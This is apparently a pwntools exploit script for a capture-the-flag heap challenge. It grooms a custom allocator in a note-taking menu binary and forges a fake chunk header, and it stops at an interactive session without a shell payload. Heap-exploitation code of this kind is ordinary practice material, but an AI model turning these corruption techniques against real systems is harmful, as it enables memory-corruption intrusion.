#!/usr/bin/env python3

from pwn import *

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('prob_patched', checksec=False)
libc = ELF('libs/libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
ru = lambda data, proc=None: proc.recvuntil(data) if proc else p.recvuntil(data)
r = lambda data, proc=None: proc.recv(data) if proc else p.recv(data)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        set max-visualize-chunk-size 0x500
        # # release
        # b*0x555555554dd4
                   
        # # Cage::put_into_bins(Cage::Block*)+299: 0x5971
        # b*0x555555555971
                   
        # # pop bin
        # b*0x555555555616          

        # # in use consolidate
        # b*0x555555555657
                   
        # # inside put into bins
        # b*0x555555555a45
                   
        # # insert bins
        b*0x555555555a57
                   
        
        c
        ''')
        sleep(1)


if args.REMOTE:
    p = remote('')
else:
    p = process([exe.path])
def switch(idx):
    slna(b'> ', 0)
    slna(b'Book: ', idx)

def write_note(idx, size, data):
    slna(b'> ', 1)
    slna(b'slot: ', idx)
    slna(b'size: ', size)
    sa(b'data: ', data)

def erase_note(idx):
    slna(b'> ', 3)
    slna(b'slot: ', idx)

PROMPT = b'> '
def read_note_raw(slot):
    slna(PROMPT, 2)
    slna(b"slot: ", slot)
    return ru(PROMPT)


def erase_note(slot):
    slna(PROMPT, 3)
    slna(b"slot: ", slot)


def erase_then_rewrite_same_slot(slot, size, payload):
    """
    Small RTT optimization used everywhere in the original script:
    send erase(slot) immediately followed by write(slot, size, payload).
    """
    s(
        b"3\n" + str(slot).encode() +
        b"\n1\n" + str(slot).encode() +
        b"\n" + str(size).encode() + b"\n"
    )
    ru(b"data: ")
    s(payload)
    ru(PROMPT)

# 0:switch  
# 1:write  
# 2:read  
# 3:erase  
# 4:discard  
# 5:tag  
# 6:exit

switch(0)

pad = 0x170

write_note(0, pad, b'a'*pad)

write_note(1, pad, p8(0x1)*pad)
write_note(2, 0x180, p8(0x2)*0x180)

write_note(3, 20, p8(0x3)*20)

erase_note(1)

erase_note(0)
GDB()

erase_note(2)
switch(1)

switch(0)

write_note(0, 0x2f0 ,b'\0'*0x2f0)

switch(1)
mini_pad = 0x18

for i in range(23):
    write_note(i, mini_pad ,p64(i).ljust(mini_pad, b'T'))

switch(0)

erase_note(0)

load = flat(
    b's'*0x180,
    0x50,
    p16(0)
)

write_note(0, 0x2f0,load)

switch(1)



# prev free chunk: 0x2819f550310

p.interactive()